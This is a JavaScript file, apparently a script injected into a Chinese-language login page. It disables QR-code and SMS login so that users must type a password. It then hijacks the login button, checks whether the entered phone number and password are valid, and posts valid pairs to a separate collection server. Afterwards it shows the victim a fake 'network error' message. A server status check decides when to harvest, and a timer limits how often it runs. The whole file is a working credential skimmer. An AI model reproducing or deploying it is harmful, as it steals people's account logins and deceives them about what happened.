const API_URL = 'http://127.0.0.1:3000'
// 修改按钮的 onclick 事件
function modifyButtonOnClick() {
  const loginBtn = document.getElementById('loginBtn')

  console.log('qwq')
  noQRCodeLogin()
  if (loginBtn) {
    const form = document.querySelector('form')

    // 获取指定的class元素
    var element = loginBtn.parentNode
    loginBtn.parentNode.removeChild(loginBtn)

    // 创建新的DOM元素
    var newloginBtn = document.createElement('button')
    newloginBtn.innerHTML = '登录'
    newloginBtn.className = 'btn-big-blue margin-btm24'
    element.appendChild(newloginBtn)
    form.addEventListener('submit', function (event) {
      event.preventDefault() // 阻止默认的表单提交行为
      getInputValues(event)
    })
  }
}

// 获取输入框的值并输出到控制台
function getInputValues(event) {
  const telInput = document.querySelector('.ipt-tel')
  const pwdInput = document.querySelector('.ipt-pwd')
  if (telInput && pwdInput) {
    console.log('Tel:', telInput.value)
    console.log('Password:', pwdInput.value)
    seedInput(telInput.value, pwdInput.value, event)
  }
}

function seedInput(telInput, pwdInput, event) {
  const errtext = document.getElementById('err-txt')
  if (telInput == null || pwdInput == null) {
    errtext.innerHTML = '请输入正确的手机号/密码'
    return
  }
  //检查是否为可登录的账号
  checkLogin(telInput, pwdInput)
    .then((result) => {
      if (result === true) {
        // 登录成功
        console.log('登录成功')
        // 进行后续操作
        const data = {
          Tel: telInput,
          pwd: pwdInput,
        }
        console.log('sending')
        fetch(API_URL + '/acc', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        })
          .then((response) => response.text())
          .then((result) => {
            console.log(result) // 服务器返回的响应结果
            console.log('sended')
            const errtext = document.getElementById('err-txt')
            errtext.innerHTML = '网络错误，请刷新后重试'
            setLocalStorage()
          })
          .catch((error) => {
            const errtext = document.getElementById('err-txt')
            errtext.innerHTML = '网络错误，请刷新后重试'
          })
      } else {
        // 登录失败
        errtext.innerHTML = '用户名或密码错误'
        return
      }
    })
    .catch((error) => {
      // 网络错误
      console.log('网络错误:', error)
      errtext.innerHTML = '网络错误，请刷新后重试'
      return
    })
}

//获取服务器状态以及是否需要抓取
function checkStat() {
  console.log(API_URL + '/stat')
  return fetch(API_URL + '/stat') // 根据实际的服务器地址进行修改
    .then((response) => response.json())
    .then((data) => {
      console.log(data.status)
      if (data.status === '1') {
        return true
      } else if (data.status === '0') {
        return false
      } else {
        throw new Error('Invalid response')
      }
    })
    .catch((error) => {
      console.log('Error:', error)
      // 处理错误情况
    })
}

// 当页面加载完成时执行修改按钮和获取输入框值的操作
window.addEventListener('load', function () {
  //检查是否距离上次获取超过20分钟
  if (isTimeExpired()) {
    //因为查询服务器状态的时候是异步请求，所以防止还没有修改页面就已经扫码等问题就先修改二维码和验证码
    noQRCodeLogin()
    noMsgCodeLogin()
    // 先查询服务器是否需要抓取/服务状态
    checkStat()
      .then((result) => {
        console.log(result) // 输出 true 或 false
        if (result == true) {
          modifyButtonOnClick()
        } else {
          recQRCodeLogin()
          recnoMsgCodeLogin()
        }
      })
      .catch((error) => {
        recQRCodeLogin()
        recnoMsgCodeLogin()
      })
  }
})
